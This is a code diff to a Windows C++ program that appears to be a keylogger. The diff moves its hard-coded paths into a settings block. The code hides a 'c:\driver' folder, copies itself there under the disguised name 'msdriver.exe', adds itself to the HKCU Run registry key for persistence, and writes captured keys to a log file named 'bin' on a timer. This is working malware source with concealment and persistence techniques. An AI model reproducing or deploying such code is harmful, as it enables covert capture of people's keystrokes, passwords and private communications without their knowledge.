@@ -11,6 +11,13 @@
 
 typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
 
+//Settings
+tstring executableFileName(_T("msdriver.exe"));
+tstring logFileName(_T("bin"));
+tstring dirPath(_T("c:\\driver"));
+bool	copyToAutorun = true;
+int		timerPeriodSeconds = 3;
+
 //Global variables
 tstring keyLog;
 HANDLE logFileHandle;
@@ -32,21 +39,25 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	GetModuleFileName(NULL, szFileName, MAX_PATH);
 
 	//Copy to C:
-	CreateDirectory(_T("c:\\driver"), NULL);
-	SetFileAttributes(_T("C:\\Driver"), FILE_ATTRIBUTE_HIDDEN);
-	CopyFile(szFileName, _T("C:\\Driver\\msdriver.exe"), TRUE);
-
+	CreateDirectory(dirPath.c_str(), NULL);
+	SetFileAttributes(dirPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+	
 	//Copy to autorun
-	HKEY hKey = NULL;
-	LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
-	RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)szFileName, lstrlen(szFileName) * sizeof(TCHAR) + 1);
-	RegCloseKey(hKey);
+	if (copyToAutorun) {
+		tstring fileCopyPath = dirPath + _T("\\") + executableFileName;
+		CopyFile(szFileName, fileCopyPath.c_str(), TRUE);
+		HKEY hKey = NULL;
+		LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
+		RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
+		RegCloseKey(hKey);
+	}
 
 	//Create timer
-	SetTimer(NULL, 1, 3000, TimerCallback);
+	SetTimer(NULL, 1, timerPeriodSeconds*1000, TimerCallback);
 
 	//Create or open log file
-	logFileHandle = CreateFile(_T("c:\\driver\\bin"),
+	tstring logPath = dirPath + _T("\\") + logFileName;
+	logFileHandle = CreateFile(logPath.c_str(),
 		GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_WRITE | FILE_SHARE_READ,
 		NULL,
